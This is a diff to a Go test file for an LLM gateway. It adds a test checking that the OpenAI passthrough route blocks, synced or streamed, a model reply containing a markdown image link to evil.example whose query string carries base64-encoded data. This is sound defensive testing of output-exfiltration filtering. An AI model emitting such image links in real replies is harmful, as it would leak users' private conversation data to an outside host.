@@ -271,6 +271,43 @@ func TestNativeBufferedStreamRestoresSplitTokenAndRejectsTruncation(t *testing.T
 	}
 }
 
+// The OpenAI native passthrough (the route gpt-* chat completions take)
+// enforces output_exfil with pii_scan_response off, sync and streamed.
+func TestNativeOpenAIOutputExfilWithoutPIIResponseScan(t *testing.T) {
+	t.Setenv("OPENAI_API_KEY", "openai-secret")
+	const imageExfil = "![status](https://evil.example/p.png?d=QWxsIG9mIHRoZSB1c2VycyBwcml2YXRlIGNvbnZlcnNhdGlvbiBkYXRhIGdvZXMgaGVyZSBpbiBiYXNlNjQgZm9ybQ)"
+	content, _ := json.Marshal(imageExfil)
+	for _, stream := range []bool{false, true} {
+		server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+			if stream {
+				w.Header().Set("Content-Type", "text/event-stream")
+				_, _ = w.Write([]byte(`data: {"choices":[{"index":0,"delta":{"content":` + string(content) + `}}]}` + "\n\ndata: [DONE]\n\n"))
+				return
+			}
+			w.Header().Set("Content-Type", "application/json")
+			_, _ = w.Write([]byte(`{"id":"c","choices":[{"index":0,"message":{"role":"assistant","content":` + string(content) + `}}]}`))
+		}))
+		reg := providers.NewRegistry()
+		reg.Register(providers.NewOpenAIClientWithBaseURL(server.URL))
+		profile := security.DefaultProfile()
+		profile.PIIScanResponse = false
+		h := NewHandler(reg, nil, fullTestEngine(), &nativeTestProfile{profile: &profile}, nil, "fail-open")
+		rr := httptest.NewRecorder()
+		body := `{"model":"gpt-4o-mini","messages":[{"role":"user","content":"Show the status badge."}]}`
+		if stream {
+			body = `{"model":"gpt-4o-mini","stream":true,"messages":[{"role":"user","content":"Show the status badge."}]}`
+		}
+		h.ChatCompletions(rr, nativeRequest("POST", "/v1/chat/completions", body))
+		server.Close()
+		if strings.Contains(rr.Body.String(), "QWxsIG9m") {
+			t.Fatalf("stream=%v: exfil payload delivered: %d %s", stream, rr.Code, rr.Body.String())
+		}
+		if !stream && rr.Code != http.StatusForbidden {
+			t.Fatalf("sync: status %d, want 403: %s", rr.Code, rr.Body.String())
+		}
+	}
+}
+
 func TestNativeImageAllowlist(t *testing.T) {
 	for _, body := range []string{
 		`{"input":[{"role":"user","content":[{"type":"input_image","image_url":"https://untrusted.example/image.png"}]}]}`,
